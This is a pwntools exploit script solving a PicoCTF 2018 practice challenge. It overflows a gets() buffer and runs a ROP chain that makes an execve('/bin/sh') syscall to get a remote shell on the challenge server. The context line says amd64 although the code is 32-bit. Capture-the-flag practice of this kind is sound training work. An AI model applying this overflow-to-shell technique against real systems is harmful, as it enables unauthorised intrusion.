from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('PicoCTF_2018_can-you-gets-me')
io = remote('node4.buuoj.cn', 29439)
elf = ELF('PicoCTF_2018_can-you-gets-me')
pop_eax_ret = 0x080b81c6
pop_edx_ecx_ebx_ret = 0x0806f050
int_80 = 0x0806cc25
buf = 0x080EAF80
gets = elf.sym['gets']

payload = cyclic(0x1c)
payload += p32(gets) + p32(pop_eax_ret) + p32(buf)
payload += p32(pop_eax_ret) + p32(11) + p32(pop_edx_ecx_ebx_ret) + p32(0) * 2 + p32(buf) + p32(int_80)
# gdb.attach(io)
# pause()
io.sendlineafter('GIVE ME YOUR NAME!\n', payload)
io.sendline('/bin/sh')
io.interactive()
